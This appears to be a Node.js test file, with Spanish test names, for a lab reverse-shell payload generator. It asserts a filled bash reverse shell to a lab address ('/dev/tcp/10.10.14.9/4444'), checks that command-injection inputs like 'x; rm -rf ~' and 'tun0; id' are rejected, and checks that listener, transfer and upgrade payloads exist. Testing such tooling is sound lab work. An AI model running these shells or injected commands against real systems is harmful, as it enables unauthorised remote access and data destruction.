import test from "node:test";
import assert from "node:assert/strict";
import { buildPayloads, fillPayload, validLhost, PAYLOADS } from "../lib/lab-payloads-core.ts";

test("rellena IP y puerto en la reverse shell de bash", () => {
  const bash = PAYLOADS.find((p) => p.id === "bash-tcp");
  assert.equal(fillPayload(bash.tpl, { lhost: "10.10.14.9", lport: 4444 }), "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1");
});
test("lo inválido queda como marcador legible, no roto", () => {
  assert.equal(fillPayload("nc {lhost} {lport}", { lhost: "x; rm -rf ~", lport: 99999 }), "nc LHOST LPORT");
  assert.equal(validLhost("10.10.14.9"), true);
  assert.equal(validLhost("tun0; id"), false);
});
test("hay payloads en todas las categorías y para varios sistemas", () => {
  const cats = new Set(PAYLOADS.map((p) => p.cat));
  assert.deepEqual([...cats].sort(), ["listener", "revshell", "transfer", "upgrade"]);
  assert.ok(PAYLOADS.some((p) => p.os === "windows"));
  assert.ok(buildPayloads({ lhost: "10.10.14.9", lport: 443 }, { cat: "revshell" }).length >= 8);
  assert.ok(buildPayloads({}, { os: "windows" }).every((p) => p.os === "windows" || p.os === "any"));
});
